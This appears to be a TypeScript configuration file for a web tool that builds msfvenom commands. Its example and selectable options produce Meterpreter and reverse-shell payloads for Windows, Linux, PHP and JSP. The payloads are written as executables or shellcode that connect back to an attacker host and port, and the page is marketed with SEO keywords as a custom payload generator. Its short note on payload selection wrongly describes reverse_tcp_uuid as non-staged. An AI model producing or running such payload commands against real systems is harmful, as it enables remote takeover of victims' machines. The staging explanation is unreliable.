import type { GeneratorConfig } from '../../types/generator';

export const payloadGenerator: GeneratorConfig = {
  id: 'msfvenom',
  name: 'MSFvenom Payload',
  description: 'Generate various types of shellcode and executable payloads.',
  categoryId: 'exploitation',
  exampleUsage: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe',
  explanation: 'MSFvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. It is used to generate payloads.',
  fields: [
    {
      id: 'payload',
      label: 'Payload Type (-p)',
      type: 'select',
      options: [
        { label: 'Windows Meterpreter Reverse TCP (x64)', value: 'windows/x64/meterpreter/reverse_tcp' },
        { label: 'Windows Meterpreter Reverse TCP (x86)', value: 'windows/meterpreter/reverse_tcp' },
        { label: 'Linux Meterpreter Reverse TCP (x64)', value: 'linux/x64/meterpreter/reverse_tcp' },
        { label: 'PHP Reverse Shell', value: 'php/reverse_php' },
        { label: 'Java/JSP Reverse Shell', value: 'java/jsp_shell_reverse_tcp' }
      ],
      defaultValue: 'windows/x64/meterpreter/reverse_tcp'
    },
    {
      id: 'lhost',
      label: 'LHOST (Attacker IP)',
      type: 'text',
      placeholder: '10.0.0.1',
      required: true,
      defaultValue: ''
    },
    {
      id: 'lport',
      label: 'LPORT (Attacker Port)',
      type: 'number',
      placeholder: '4444',
      required: true,
      defaultValue: 4444
    },
    {
      id: 'format',
      label: 'Output Format (-f)',
      type: 'select',
      options: [
        { label: 'Windows Executable (.exe)', value: 'exe' },
        { label: 'Linux ELF (.elf)', value: 'elf' },
        { label: 'Raw / Shellcode', value: 'raw' },
        { label: 'Python (.py)', value: 'python' },
        { label: 'PHP Script (.php)', value: 'raw' }
      ],
      defaultValue: 'exe'
    },
    {
      id: 'output',
      label: 'Output File (-o)',
      type: 'text',
      placeholder: 'payload.exe',
      required: true,
      defaultValue: 'payload.exe'
    }
  ],
  generateCommand: (values: Record<string, string | boolean | number>) => {
    const parts = ['msfvenom', '-p', values.payload || 'windows/meterpreter/reverse_tcp'];
    if (values.lhost) parts.push(`LHOST=${values.lhost}`);
    if (values.lport) parts.push(`LPORT=${values.lport}`);
    if (values.format) parts.push(`-f ${values.format}`);
    if (values.output) parts.push(`-o ${values.output}`);
    return parts.join(' ');
  },
  seo: {
    title: 'Metasploit Payload Generator - Custom MSFvenom Payloads',
    description: 'Create custom Metasploit payloads for various architectures and platforms. Easy-to-use GUI for complex msfvenom commands.',
    keywords: ['metasploit payload generator', 'msfvenom GUI', 'reverse tcp payload', 'meterpreter generator', 'custom shellcode']
  },
  additionalContent: [
    {
      title: 'Payload Selection',
      content: `Choosing the right payload is critical. Staged payloads (like reverse_tcp) are smaller as they only include the 'stager' that downloads the rest. Non-staged payloads (like reverse_tcp_uuid) include the entire code but are larger.`
    }
  ]
};
